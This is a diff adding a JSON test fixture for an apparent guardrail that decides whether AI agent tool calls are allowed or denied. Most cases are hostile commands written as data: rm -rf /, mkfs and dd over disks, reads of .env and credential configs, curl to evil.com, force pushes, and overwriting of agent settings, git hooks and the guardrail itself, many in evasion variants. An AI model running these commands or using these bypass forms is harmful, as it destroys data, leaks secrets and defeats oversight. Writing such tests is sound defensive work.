@@ -1,0 +1,514 @@
+[
+  {
+    "name": "double-quoted rm target",
+    "tool": "Bash",
+    "command": "rm -rf \"/etc\"",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "single-quoted rm target",
+    "tool": "Bash",
+    "command": "rm -rf '/etc'",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "double-quoted env read",
+    "tool": "Bash",
+    "command": "cat \"/home/u/.env\"",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "double-quoted force push flag",
+    "tool": "Bash",
+    "command": "git push \"--force\"",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "absolute rm executable",
+    "tool": "Bash",
+    "command": "/bin/rm -rf /",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "absolute sudo executable",
+    "tool": "Bash",
+    "command": "/usr/bin/sudo rm -rf /",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "absolute mkfs executable",
+    "tool": "Bash",
+    "command": "/sbin/mkfs.ext4 /dev/sda1",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "dot-segment kube config read",
+    "tool": "Bash",
+    "command": "cat /home/u/.kube/./config",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy over claude settings",
+    "tool": "Bash",
+    "command": "cp evil /home/u/.claude/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "remove claude settings",
+    "tool": "Bash",
+    "command": "rm /home/u/.claude/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "replace installed guardrail",
+    "tool": "Bash",
+    "command": "install -m755 evil /home/u/.local/bin/guardrail",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "sed git hook in place",
+    "tool": "Bash",
+    "command": "sed -i s/a/b/ /repo/.git/hooks/pre-commit",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "replace git hook symlink",
+    "tool": "Bash",
+    "command": "ln -sf evil /repo/.git/hooks/pre-commit",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "dd over git hook",
+    "tool": "Bash",
+    "command": "dd if=evil of=/repo/.git/hooks/pre-commit",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "write overlay",
+    "tool": "Write",
+    "paths": ["/repo/guardrail.toml"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "write opencode adapter",
+    "tool": "Write",
+    "paths": ["/repo/.guardrail/guardrail.js"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "write dot-segment git config",
+    "tool": "Write",
+    "paths": ["/repo/.git/./config"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "read claude instructions",
+    "tool": "Read",
+    "paths": ["/repo/CLAUDE.md"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
+  },
+  {
+    "name": "read agent instructions",
+    "tool": "Read",
+    "paths": ["/repo/AGENTS.md"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
+  },
+  {
+    "name": "read claude skill",
+    "tool": "Read",
+    "paths": ["/home/u/.claude/skills/x/SKILL.md"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
+  },
+  {
+    "name": "read git config",
+    "tool": "Read",
+    "paths": ["/repo/.git/config"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
+  },
+  {
+    "name": "double-quoted egress URL",
+    "tool": "Bash",
+    "command": "curl \"http://evil.com/x\"",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "single-quoted dd output",
+    "tool": "Bash",
+    "command": "dd of='/dev/sda' if=/dev/zero",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "exact review env read",
+    "tool": "Bash",
+    "command": "cat \"/home/carlitos/.env\"",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "double-separator git config",
+    "tool": "Write",
+    "paths": ["/repo/.git//config"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "parent-segment git config",
+    "tool": "Write",
+    "paths": ["/repo/.git/x/../config"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "dot-segment docker config read",
+    "tool": "Bash",
+    "command": "cat /home/u/.docker/./config.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "read claude plugin cache",
+    "tool": "Read",
+    "paths": ["/home/u/.claude/plugins/cache/x/y.js"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
+  },
+  {
+    "name": "read git hook",
+    "tool": "Read",
+    "paths": ["/repo/.git/hooks/pre-commit"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "allow"
+  },
+  {
+    "name": "write opencode config",
+    "tool": "Write",
+    "paths": ["/repo/opencode.json"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "write agents hooks",
+    "tool": "Write",
+    "paths": ["/repo/.agents/hooks.json"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "write gemini hooks",
+    "tool": "Write",
+    "paths": ["/home/u/.gemini/config/hooks.json"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "write repository guardrail binary",
+    "tool": "Write",
+    "paths": ["/repo/bin/guardrail"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "write user guardrail binary",
+    "tool": "Write",
+    "paths": ["/home/u/.local/bin/guardrail"],
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy exact review git hook",
+    "tool": "Bash",
+    "command": "cp /tmp/evil /repo/.git/hooks/pre-commit",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "install exact review git hook",
+    "tool": "Bash",
+    "command": "install -m755 /tmp/evil /repo/.git/hooks/pre-commit",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "pipe tee over claude settings",
+    "tool": "Bash",
+    "command": "echo x | tee /repo/.claude/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy over shell rc",
+    "tool": "Bash",
+    "command": "cp /tmp/evil ~/.bashrc",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy over tilde claude settings",
+    "tool": "Bash",
+    "command": "cp /tmp/evil ~/.claude/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "remove tilde claude settings",
+    "tool": "Bash",
+    "command": "rm ~/.claude/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "replace tilde guardrail binary",
+    "tool": "Bash",
+    "command": "install -m755 /tmp/evil ~/.local/bin/guardrail",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy target directory long attached",
+    "tool": "Bash",
+    "command": "cp --target-directory=/home/u/.claude /tmp/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "move target directory long separated",
+    "tool": "Bash",
+    "command": "mv --target-directory /home/u/.claude /tmp/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "install target directory long attached",
+    "tool": "Bash",
+    "command": "install --target-directory=/home/u/.local/bin /tmp/guardrail",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "install target directory long separated",
+    "tool": "Bash",
+    "command": "install --target-directory /home/u/.local/bin /tmp/guardrail",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "link target directory short separated",
+    "tool": "Bash",
+    "command": "ln -t /repo/.git/hooks /tmp/pre-commit",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy target directory short attached",
+    "tool": "Bash",
+    "command": "cp -t/home/u/.claude /tmp/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy target directory short separated",
+    "tool": "Bash",
+    "command": "cp -t /home/u/.claude /tmp/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy clustered target directory",
+    "tool": "Bash",
+    "command": "cp -vt /home/u/.claude /tmp/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "move clustered target directory",
+    "tool": "Bash",
+    "command": "mv -vt/home/u/.claude /tmp/settings.json",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "install clustered target directory",
+    "tool": "Bash",
+    "command": "install -vDt /home/u/.local/bin /tmp/guardrail",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "link clustered target directory",
+    "tool": "Bash",
+    "command": "ln -sft/repo/.git/hooks /tmp/pre-commit",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy destination before suffix value",
+    "tool": "Bash",
+    "command": "cp /tmp/evil /repo/guardrail.toml --suffix .bak",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy destination before attached suffix value",
+    "tool": "Bash",
+    "command": "cp /tmp/evil /repo/guardrail.toml --suffix=.bak",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "move destination before suffix value",
+    "tool": "Bash",
+    "command": "mv /tmp/evil /repo/guardrail.toml -S .bak",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "install destination before mode value",
+    "tool": "Bash",
+    "command": "install /tmp/evil /repo/guardrail.toml --mode 755",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "link destination before suffix value",
+    "tool": "Bash",
+    "command": "ln -s /tmp/evil /repo/.git/hooks/pre-commit -S.bak",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "rsync destination before backup directory",
+    "tool": "Bash",
+    "command": "rsync /tmp/evil /repo/guardrail.toml --backup-dir /tmp/backups",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "rsync protected backup directory",
+    "tool": "Bash",
+    "command": "rsync /tmp/evil /tmp --backup-dir /repo/.claude",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy destination before unknown option value",
+    "tool": "Bash",
+    "command": "cp /tmp/evil /repo/guardrail.toml --unknown-option value",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "copy flag-shaped source and protected destination",
+    "tool": "Bash",
+    "command": "cp /tmp/evil -- --suffix /repo/guardrail.toml",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "absolute git executable",
+    "tool": "Bash",
+    "command": "/usr/bin/git push --force origin main",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "absolute curl executable",
+    "tool": "Bash",
+    "command": "/usr/bin/curl https://evil.com/x",
+    "cwd": "/repo",
+    "repo_root": "/repo",
+    "want": "deny"
+  },
+  {
+    "name": "safe nested repository delete",
+    "tool": "Bash",
+    "command": "rm -rf ../build",
+    "cwd": "/repo/sub",
+    "repo_root": "/repo",
+    "want": "allow"
+  }
+]
